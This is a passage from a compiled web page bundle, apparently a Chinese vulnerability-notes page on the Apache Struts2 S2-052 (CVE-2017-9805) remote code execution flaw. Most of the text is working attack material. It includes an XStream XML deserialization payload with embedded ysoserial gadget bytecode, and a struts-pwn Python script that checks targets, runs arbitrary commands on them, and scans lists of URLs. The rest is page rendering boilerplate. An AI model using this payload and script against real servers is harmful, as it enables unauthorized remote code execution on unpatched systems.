AAAGAAEAAAAzAA4AAAAgAAMAAAABAA8AMgAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAa
AAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA3AA4AAAAqAAQAAAABAA8AMgAA
AAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAiAAMA
AgAAAA2nAAMBTBEnEIW4AC+xAAAAAQAwAAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ
&lt;/byte-array&gt;
                            &lt;byte-array&gt;yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu
dFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA
EkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2Vy
aWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2
YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xh
bmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRp
bC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQAB
AAAABSq3AAGxAAAAAgANAAAABgABAAAAOwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAA
AAoAAQACABYAEAAJ&lt;/byte-array&gt;
                          &lt;/__bytecodes&gt;
                          &lt;__transletIndex&gt;-1&lt;/__transletIndex&gt;
                          &lt;__indentNumber&gt;0&lt;/__indentNumber&gt;
                        &lt;/default&gt;
                        &lt;boolean&gt;false&lt;/boolean&gt;
                      &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;
                    &lt;/next&gt;
                  &lt;/iter&gt;
                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;
                    &lt;method&gt;
                      &lt;class&gt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/class&gt;
                      &lt;name&gt;newTransformer&lt;/name&gt;
                      &lt;parameter-types/&gt;
                    &lt;/method&gt;
                    &lt;name&gt;foo&lt;/name&gt;
                  &lt;/filter&gt;
                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;
                &lt;/serviceIterator&gt;
                &lt;lock/&gt;
              &lt;/cipher&gt;
              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;
              &lt;ibuffer/&gt;
              &lt;done&gt;false&lt;/done&gt;
              &lt;ostart&gt;0&lt;/ostart&gt;
              &lt;ofinish&gt;0&lt;/ofinish&gt;
              &lt;closed&gt;false&lt;/closed&gt;
            &lt;/is&gt;
            &lt;consumed&gt;false&lt;/consumed&gt;
          &lt;/dataSource&gt;
          &lt;transferFlavors/&gt;
        &lt;/dataHandler&gt;
        &lt;dataLen&gt;0&lt;/dataLen&gt;
      &lt;/value&gt;
    &lt;/jdk.nashorn.internal.objects.NativeString&gt;
    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;
  &lt;/entry&gt;
  &lt;entry&gt;
    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
  &lt;/entry&gt;
&lt;/map&gt;
&quot;&quot;&quot;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2017-9805)&#39;</span><span class="token punctuation">,</span>
        <span class="token comment"># &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36&#39;,</span>
        <span class="token string">&#39;Referer&#39;</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;application/xml&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Accept&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;*/*&#39;</span>
    <span class="token punctuation">}</span>

    timeout <span class="token operator">=</span> <span class="token number">8</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload_sleep_based_10seconds<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token comment"># if the response returned before the request timeout.</span>
        <span class="token comment"># then, the host should not be vulnerable.</span>
        <span class="token comment"># The request should return &gt; 10 seconds, while the timeout is 8.</span>
        result <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        result <span class="token operator">=</span> <span class="token boolean">True</span>
    <span class="token keyword">return</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> usedlist<span class="token operator">=</span>usedlist<span class="token punctuation">,</span> cmd<span class="token operator">=</span>cmd<span class="token punctuation">,</span> do_exploit<span class="token operator">=</span>do_exploit<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> url<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> do_exploit<span class="token punctuation">:</span>
            result <span class="token operator">=</span> check<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
            output <span class="token operator">=</span> <span class="token string">&#39;[*] Status: &#39;</span>
            <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
                output <span class="token operator">+=</span> <span class="token string">&#39;Vulnerable!&#39;</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                output <span class="token operator">+=</span> <span class="token string">&#39;Not Affected.&#39;</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            exploit<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[$] Request sent.&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[.] If the host is vulnerable, the command will be executed in the background.&quot;</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> usedlist<span class="token punctuation">:</span>
        URLs_List <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            f_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>usedlist<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&#39;r&#39;</span><span class="token punctuation">)</span>
            URLs_List <span class="token operator">=</span> f_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;\\r&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                URLs_List<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
                <span class="token keyword">pass</span>
            f_file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Error: There was an error in reading list file.&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Exception: &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> url <span class="token keyword">in</span> URLs_List<span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> do_exploit<span class="token punctuation">:</span>
                result <span class="token operator">=</span> check<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
                output <span class="token operator">=</span> <span class="token string">&#39;[*] Status: &#39;</span>
                <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
                    output <span class="token operator">+=</span> <span class="token string">&#39;Vulnerable!&#39;</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    output <span class="token operator">+=</span> <span class="token string">&#39;Not Affected.&#39;</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                exploit<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[$] Request sent.&quot;</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[.] If the host is vulnerable, the command will be executed in the background.&quot;</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[%] Done.&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        main<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> usedlist<span class="token operator">=</span>usedlist<span class="token punctuation">,</span> cmd<span class="token operator">=</span>cmd<span class="token punctuation">,</span> do_exploit<span class="token operator">=</span>do_exploit<span class="token punctuation">)</span>
    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;\\nKeyboardInterrupt Detected.&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Exiting...&#39;</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,27);function m(k,b){const s=i("ExternalLinkIcon");return p(),o("div",null,[r,n("ul",null,[n("li",null,[n("a",u,[a("http://struts.apache.org/docs/s2-052.html"),t(s)])]),n("li",null,[n("a",d,[a("https://yq.aliyun.com/articles/197926"),t(s)])])]),v])}const h=l(c,[["render",m],["__file","Struts2 S2-052 远程代码执行漏洞 CVE-2017-9805.html.vue"]]);export{h as default};
